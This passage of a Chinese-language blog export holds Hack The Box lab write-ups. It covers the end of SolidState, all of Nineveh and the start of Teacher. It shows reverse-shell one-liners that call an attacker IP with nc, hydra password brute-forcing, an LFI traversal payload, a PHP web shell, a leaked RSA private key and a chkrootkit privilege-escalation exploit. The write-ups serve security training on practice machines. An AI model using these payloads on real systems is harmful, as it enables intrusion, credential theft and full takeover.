 2332   616 ?        Ss   Jul10   0:00 /bin/sh /opt/james-2.3.2/bin/run.sh\nroot       575  0.1  3.7 854972 77232 ?        Sl   Jul10   0:19 /usr/lib/jvm/java-8-openjdk-i386//bin/java -Djava.ext.dirs=/opt/james-2.3.2/lib:/opt/james-2.3.2/tools/lib -Djava.security.manager -Djava.security.policy=jar:file:/opt/james-2.3.2/bin/phoenix-loader.jar!/META-INF/java.policy -Dnetworkaddress.cache.ttl=300 -Dphoenix.home=/opt/james-2.3.2 -Djava.io.tmpdir=/opt/james-2.3.2/temp -jar /opt/james-2.3.2/bin/phoenix-loader.jar\nmindy    23970  0.0  0.0   4736   800 pts/0    S+   02:15   0:00 grep james\n```\n可以看到，有一个 sh 一直运行着的 run.sh 文件去查看下是啥东西\n\n```bash\n${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat /opt/james-2.3.2/bin/run.sh\n#! /bin/sh\n#\n# -----------------------------------------------------------------------------\n# Phoenix start script.\n#\n\n# OS specific support.  $var _must_ be set to either true or false.\ncygwin=false\ncase \"`uname`\" in\nCYGWIN*) cygwin=true;;\nesac\n\n# resolve links - $0 may be a softlink\nTHIS_PROG=\"$0\"\n\nwhile [ -h \"$THIS_PROG\" ]; do\n  ls=`ls -ld \"$THIS_PROG\"`\n  link=`expr \"$ls\" : '.*-> \\(.*\\)$'`\n  if expr \"$link\" : '.*/.*' > /dev/null; then\n    THIS_PROG=\"$link\"\n  else\n    THIS_PROG=`dirname \"$THIS_PROG\"`/\"$link\"\n  fi\ndone\n\n# Get standard environment variables\nPRGDIR=`dirname \"$THIS_PROG\"`\nPHOENIX_HOME=`cd \"$PRGDIR/..\" ; pwd`\n\nunset THIS_PROG\n\n# For Cygwin, ensure paths are in UNIX format before anything is touched\nif $cygwin; then\n  [ -n \"$PHOENIX_HOME\" ] && PHOENIX_HOME=`cygpath --unix \"$PHOENIX_HOME\"`\nfi\n\n$PHOENIX_HOME/bin/phoenix.sh run $*\n```\n没看到啥有用的东西\n\n但是可以确定的是肯定和 opt 目录下的东西有关，咱们去看看\n\n```bash\n${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la\ntotal 16\ndrwxr-xr-x  3 root root 4096 Aug 22  2017 .\ndrwxr-xr-x 22 root root 4096 May 27 11:05 ..\ndrwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2\n-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py\n```\n这边有点异常，在 /opt 目录下发现一个 tmp.py 的文件，权限是 777 的\n\n```bash\n${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py \n#!/usr/bin/env python\nimport os\nimport sys\ntry:\n     os.system('rm -r /tmp/* ')\nexcept:\n     sys.exit()\n```\n这边看着像是个实时运行的脚本，尝试写入反弹 shell 的东西\n\n```bash\necho \"import os;os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 4444 >/tmp/f')\" > /opt/tmp.py\n```\n然后使用 nc 监听一个端口\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# nc -nvlp 4444                                      \nlistening on [any] 4444 ...\nconnect to [10.10.14.19] from (UNKNOWN) [10.10.10.51] 37764\n/bin/sh: 0: can't access tty; job control turned off\n# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功拿到 root 权限\n\n```bash\n# cat /root/root.txt\n096c5f57afdfe824d5827ea17af7756c\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Nineveh - Hackthebox","url":"/2022/07/08/Hackthebox/Medium/Hackthebox-Nineveh/","content":"\n# Hackthebox - Nineveh\n# 靶场信息\n![](Hackthebox-Nineveh/3241f2e3-61a5-4ea3-9236-6dae2163a58f.png)\n\n# 靶场类型\n![](Hackthebox-Nineveh/b36799a5-9199-43ae-88ad-c421c7a18ed5.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.43\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-05 09:06 CST\nNmap scan report for 10.10.10.43\nHost is up (0.35s latency).\nNot shown: 65533 filtered tcp ports (no-response)\nPORT    STATE SERVICE  VERSION\n80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n| tls-alpn: \n|_  http/1.1\n|_http-title: 400 Bad Request\n| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR\n| Not valid before: 2017-07-01T15:03:30\n|_Not valid after:  2018-07-01T15:03:30\n|_ssl-date: TLS randomness does not represent time\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 3.10 - 4.11 (91%), Linux 3.12 (91%), Linux 3.13 (91%), Linux 3.13 or 4.2 (91%), Linux 3.16 (91%), Linux 3.16 - 4.6 (91%), Linux 3.18 (91%), Linux 3.2 - 4.9 (91%), Linux 4.2 (91%), Linux 4.4 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   345.03 ms 10.10.14.1\n2   343.72 ms 10.10.10.43\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 75.37 seconds\n```\n## Http\n![](Hackthebox-Nineveh/1fe1e35c-96a2-487e-aedf-99d1fb72110c.png)\n\n## Https\n![](Hackthebox-Nineveh/4db315eb-539a-4ba8-9abe-a4e2897d7a1e.png)\n\nhttp 和 https 都没有什么可用的东西，进行 fuzz 看一下\n\n## Fuzz\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# ffuf -u 'http://10.10.10.43/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.43/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 200\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\nserver-status           [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 341ms]\n                        [Status: 200, Size: 178, Words: 22, Lines: 6, Duration: 345ms]\ndepartment              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 342ms]\n:: Progress: [30000/30000] :: Job [1/1] :: 289 req/sec :: Duration: [0:02:52] :: Errors: 59 ::\n```\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# ffuf -u 'https://10.10.10.43/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : https://10.10.10.43/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 200\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\ndb                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 1489ms]\nserver-status           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 351ms]\n                        [Status: 200, Size: 49, Words: 3, Lines: 2, Duration: 378ms]\n:: Progress: [30000/30000] :: Job [1/1] :: 134 req/sec :: Duration: [0:05:04] :: Errors: 38 ::\n```\n首先看一下 http 的内容\n\n![](Hackthebox-Nineveh/17c2ed60-e7d9-4c8b-a9c1-bf6fb986b8f1.png)\n\n这边有个登录口，可以对账号进行遍历，得到了一个账号 admin，对密码进行一下尝试爆破\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 -V -f http-post-form '/department/login.php:username=^USER^&password=^PASS^:invalid password'\nHydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-07 14:11:26\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking http-post-form://10.10.10.43:80/department/login.php:username=^USER^&password=^PASS^:invalid password\n\n[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t\n[STATUS] attack finished for 10.10.10.43 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-07 14:38:57\n```\n成功拿到一个账号密码\n\n```bash\nusername = admin\npassword = 1q2w3e4r5t\n```\n![](Hackthebox-Nineveh/ac278010-6e8b-44f9-8520-0f011079c659.png)\n\n成功登入后台\n\n# 漏洞利用\n```bash\nHave you fixed the login page yet! hardcoded username and password is really bad idea!\n\ncheck your serect folder to get in! figure it out! this is your challenge\n\nImprove the db interface.\n~amrois\n```\n在 notes 中发现了一个提示\n\n![](Hackthebox-Nineveh/f45a0cea-3067-4971-97f9-58e5409ef69e.png)\n\n这边的域名很有趣，[http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt](http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt) 我猜测应该是具有 LFI 的，尝试进行利用\n\n![](Hackthebox-Nineveh/6f30aa96-c154-408d-8c01-fd3eb2e6a17e.png)\n\n```bash\nhttp://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd\n```\n成功绕过获得一个 LFI 漏洞\n\n```bash\nhttp://10.10.10.43/department/manage.php?notes=/ninevehNotes.txt/../etc/passwd\n```\n对 poc 长度进行了一下简化\n\n![](Hackthebox-Nineveh/2dd1d92c-eaed-4a08-9d01-18da1894595c.png)\n\n这边找到一个 phpinfo 页面\n\n```bash\nhttp://10.10.10.43/info.php\n```\n暂时没什么思路进行破解，看看 https 的内容吧\n\n![](Hackthebox-Nineveh/38c4a437-8d59-46da-820f-116460d3f479.png)\n\n这边还是需要爆破\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# hydra 10.10.10.43 -l admin -P /usr/share/wordlists/rockyou.txt -V -f https-post-form '/db/index.php:password=^PASS^&remember=yes&logn=Log+In&proc_login=true:Incorrect password'\nHydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-07 15:05:26\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking http-post-forms://10.10.10.43:443/db/index.php:password=^PASS^&remember=yes&logn=Log+In&proc_login=true:Incorrect password\n\n[443][http-post-form] host: 10.10.10.43   login: admin   password: password123\n[STATUS] attack finished for 10.10.10.43 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-07 15:34:26\n```\n获得了一个密码 password123\n\n![](Hackthebox-Nineveh/f6835434-2c32-48af-86bb-03e5eeafa4e1.png)\n\n成功进入管理面板\n\n> [https://www.exploit-db.com/exploits/24044](https://www.exploit-db.com/exploits/24044)\n\n根据面板的版本，找到了一个远程 PHP 代码注入\n\n![](Hackthebox-Nineveh/261b830f-8029-49a5-a9df-4e34dad9b5b2.png)\n\n新建一个文章\n\n```bash\n<?php echo system($_REQUEST[\"cmd\"]);?>\n```\n然后写入一句话木马\n\n![](Hackthebox-Nineveh/c82d5236-6a4a-4f52-b162-33c5e7711a09.png)\n\n![](Hackthebox-Nineveh/64d8edd5-29e3-47c5-89a4-ce91f7b44a5a.png)\n\n接着修改一下加载的库\n\n![](Hackthebox-Nineveh/552fc014-21eb-4f5f-a7ae-dede4160395d.png)\n\n成功执行命令，然后使用 nc 监听一个端口，接着构造一个反弹 shell 的 poc\n\n```bash\nhttp://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+10.10.14.19+4444+%3E/tmp/f\n```\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.19] from (UNKNOWN) [10.10.10.43] 57110\n/bin/sh: 0: can't access tty; job control turned off\n$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")';\nwww-data@nineveh:/var/www/html/department$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n成功得到一个 shel\n\n# 权限提升\n## User\n```bash\nwww-data@nineveh:/var/www/ssl/secure_notes$ ls\nls\nindex.html  nineveh.png\nwww-data@nineveh:/var/www/ssl/secure_notes$ file nineveh.png\nfile nineveh.png\nnineveh.png: PNG image data, 1497 x 746, 8-bit/color RGB, non-interlaced\n```\n在 /var/www/ssl/secure\\_notes 目录中找到了一个名为 nineveh.png 的图片，去访问一下看看\n\n> [https://10.10.10.43/secure\\_notes/nineveh.png](https://10.10.10.43/secure_notes/nineveh.png)\n\n![](Hackthebox-Nineveh/3f201058-4faf-46aa-8417-1ea71b8847f2.png)\n\n在这显示个这个，肯定不太对劲，估计是有文件隐写，查看一下\n\n```bash\nwww-data@nineveh:/var/www/ssl/secure_notes$ strings nineveh.png\nstrings nineveh.png\n```\n```bash\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI\nH9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU\nPdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5\nFQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI\n3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT\nX+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn\nKiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk\nFYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z\nGRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR\nJZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo\n9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu\nBato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb\nujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl\n1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b\nvCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx\nDdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89\nP+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC\nfGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i\ntYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC\niEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1\nMxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh\nPNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse\ni6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc\nil6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7\nfw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG\n-----END RSA PRIVATE KEY-----\nsecret/nineveh.pub\n0000644\n0000041\n0000041\n00000000620\n13126060277\n014541\nustar  \nwww-data\nwww-data\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb\n```\n找到了一串 sshkey\n\n```bash\nwww-data@nineveh:/var/www/ssl/secure_notes$ cat /etc/passwd |grep bash\ncat /etc/passwd |grep bash\nroot:x:0:0:root:/root:/bin/bash\namrois:x:1000:1000:,,,:/home/amrois:/bin/bash\n```\n找到了我们可以登陆的账户 amrois 然后把 sshkey 保存为 id\\_rsa 给予 600 权限\n\n```bash\nchmod 600 id_rsa\n```\n测试后发现 22 端口没有打开，我们还得想办法打开 22 端口\n\n```bash\nwww-data@nineveh:/var/www/html/department$ cat /etc/knockd.conf\ncat /etc/knockd.conf\n[options]\n logfile = /var/log/knockd.log\n interface = ens160\n\n[openSSH]\n sequence = 571, 290, 911 \n seq_timeout = 5\n start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT\n tcpflags = syn\n\n[closeSSH]\n sequence = 911,290,571\n seq_timeout = 5\n start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT\n tcpflags = syn\n```\n找到了一个文件，查看了一下，百度了一下，应该是一个端口敲门\n\n> [https://lingwu111.github.io/端口敲门技术.html](https://lingwu111.github.io/%E7%AB%AF%E5%8F%A3%E6%95%B2%E9%97%A8%E6%8A%80%E6%9C%AF.html)\n\n找到了一篇文章，讲解了端口敲门的原理\n\n简单的说，就是我们得依次访问 571、290、911 这三个端口，然后达成一个叩叩叩敲门的效果，然后防火墙就会来开门，把 22 端口向我们开放\n\n```bash\nfor x in 571 290 911 ; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 10.10.10.43; done\n```\n编写好相关语句，去开始敲门吧\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# nmap -p22 10.10.10.43                                                                        \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 12:20 CST\nNmap scan report for 10.10.10.43\nHost is up (0.42s latency).\n\nPORT   STATE    SERVICE\n22/tcp filtered ssh\n\nNmap done: 1 IP address (1 host up) scanned in 4.79 seconds\n\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# for x in 571 290 911 ; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 10.10.10.43; done\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 12:20 CST\nWarning: 10.10.10.43 giving up on port because retransmission cap hit (0).\nNmap scan report for 10.10.10.43\nHost is up.\n\nPORT    STATE    SERVICE\n571/tcp filtered umeter\n\nNmap done: 1 IP address (1 host up) scanned in 1.07 seconds\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 12:20 CST\nWarning: 10.10.10.43 giving up on port because retransmission cap hit (0).\nNmap scan report for 10.10.10.43\nHost is up.\n\nPORT    STATE    SERVICE\n290/tcp filtered unknown\n\nNmap done: 1 IP address (1 host up) scanned in 1.07 seconds\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 12:20 CST\nWarning: 10.10.10.43 giving up on port because retransmission cap hit (0).\nNmap scan report for 10.10.10.43\nHost is up.\n\nPORT    STATE    SERVICE\n911/tcp filtered xact-backup\n\nNmap done: 1 IP address (1 host up) scanned in 1.08 seconds\n\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# nmap -p22 10.10.10.43                                                                        \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 12:20 CST\nNmap scan report for 10.10.10.43\nHost is up (0.38s latency).\n\nPORT   STATE SERVICE\n22/tcp open  ssh\n\nNmap done: 1 IP address (1 host up) scanned in 0.83 seconds\n```\n成功敲开 22 端口\n\n去连接 ssh\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# ssh amrois@10.10.10.43 -i id_rsa\nThe authenticity of host '10.10.10.43 (10.10.10.43)' can't be established.\nED25519 key fingerprint is SHA256:kxSpgxC8gaU9OypTJXFLmc/2HKEmnDMIjzkkUiGLyuI.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.43' (ED25519) to the list of known hosts.\nUbuntu 16.04.2 LTS\nWelcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n288 packages can be updated.\n207 updates are security updates.\n\nYou have mail.\nLast login: Mon Jul  3 00:19:59 2017 from 192.168.0.14\namrois@nineveh:~$ whoami&&id\namrois\nuid=1000(amrois) gid=1000(amrois) groups=1000(amrois)\n```\n成功提权到 user 权限\n\n```bash\namrois@nineveh:~$ ls\nuser.txt\namrois@nineveh:~$ cat user.txt \ne451f28264547fd414a407d0c8fccb78\n```\n成功拿到 user 权限的 flag 文件\n\n## Root\n首先跑一个 linpeas.sh\n\n```bash\n╔══════════╣ SGID\n╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            \n-rwxr-sr-x 1 root shadow 35K Mar 16  2016 /sbin/pam_extrausers_chkpwd                                                                                                                                                                       \n-rwxr-sr-x 1 root shadow 35K Mar 16  2016 /sbin/unix_chkpwd\n-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter\n-rwxr-sr-x 1 root tty 15K Mar  1  2016 /usr/bin/bsd-write\n-rwxr-sr-x 1 root utmp 425K Feb  7  2016 /usr/bin/screen  --->  GNU_Screen_4.5.0\n-rwxr-sr-x 1 root shadow 61K Mar 29  2016 /usr/bin/chage\n-rwxr-sr-x 1 root mlocate 39K Nov 18  2014 /usr/bin/mlocate\n-rwxr-sr-x 1 root ssh 351K Mar 16  2017 /usr/bin/ssh-agent\n-rwxr-sr-x 1 root crontab 36K Apr  5  2016 /usr/bin/crontab\n-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)\n-rwxr-sr-x 1 root shadow 23K Mar 29  2016 /usr/bin/expiry\n-rwxr-sr-x 1 root tty 27K Dec 16  2016 /usr/bin/wall\n```\n这边是看到有权限对 crontab 进行执行的，去查看一下\n\n```bash\namrois@nineveh:~$ crontab -l\n# Edit this file to introduce tasks to be run by cron.\n# \n# Each task to run has to be defined through a single line\n# indicating with different fields when the task will be run\n# and what command to run for the task\n# \n# To define the time you can provide concrete values for\n# minute (m), hour (h), day of month (dom), month (mon),\n# and day of week (dow) or use '*' in these fields (for 'any').# \n# Notice that tasks will be started based on the cron's system\n# daemon's notion of time and timezones.\n# \n# Output of the crontab jobs (including errors) is sent through\n# email to the user the crontab file belongs to (unless redirected).\n# \n# For example, you can run a backup of all your user accounts\n# at 5 a.m every week with:\n# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/\n# \n# For more information see the manual pages of crontab(5) and cron(8)\n# \n# m h  dom mon dow   command\n*/10 * * * * /usr/sbin/report-reset.sh\n```\n找到了一个脚本\n\n```bash\namrois@nineveh:~$ cat /usr/sbin/report-reset.sh\n#!/bin/bash\n\nrm -rf /report/*.txt\n```\n```bash\namrois@nineveh:~$ ls -la /report/\ntotal 24\ndrwxr-xr-x  2 amrois amrois 4096 Jul  8 00:21 .\ndrwxr-xr-x 24 root   root   4096 Jan 29  2021 ..\n-rw-r--r--  1 amrois amrois 4815 Jul  8 00:20 report-22-07-08:00:20.txt\n-rw-r--r--  1 amrois amrois 4815 Jul  8 00:21 report-22-07-08:00:21.txt\n```\n不太了解是什么，去看下查询一下\n\n在查询以及跑了一个 pspy 后，得到了一个一直持续运行着的文件 /usr/bin/chkrootkit\n\n> [https://www.exploit-db.com/exploits/33899](https://www.exploit-db.com/exploits/33899)\n\n经过查找后，找到了这么一个漏洞\n\n然后在 /tmp 下创建一个名为 update 的文件，写入如下内容\n\n```bash\n#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 4444 >/tmp/f\n```\n给 update 一个执行权限\n\n```bash\nchmod +x /tmp/update\n```\n然后使用 nc 开启一个端口监听 等待 shell 回来就可以了\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.19] from (UNKNOWN) [10.10.10.43] 57140\n/bin/sh: 0: can't access tty; job control turned off\n# whoami&&id                      \nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功提权到 root 权限\n\n```bash\n# cat /root/root.txt\na35547e94d50dd524433ee8e427733ea\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Teacher - Hackthebox","url":"/2022/06/30/Hackthebox/Easy/Hackthebox-Teacher/","content":"\n# Hackthebox - Teacher\n# 靶场信息\n![](Hackthebox-Teacher/29d2c6d8-74e6-456b-8f84-c0d1839c69d2.png)\n\n# 靶场类型\n![](Hackthebox-Teacher/12fbbd6f-c0d6-4865-9f6b-45b11f112e19.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root💀lucifiel)-[~]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.153\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-06-30 09:20 CST\nNmap scan report for 10.10.10.153\nHost is up (0.17s latency).\nNot shown: 65534 closed ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.25 ((Debian))\n|_http-server-header: Apache/2.4.25 (Debian)\n|_http-title: Blackhat highschool\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP 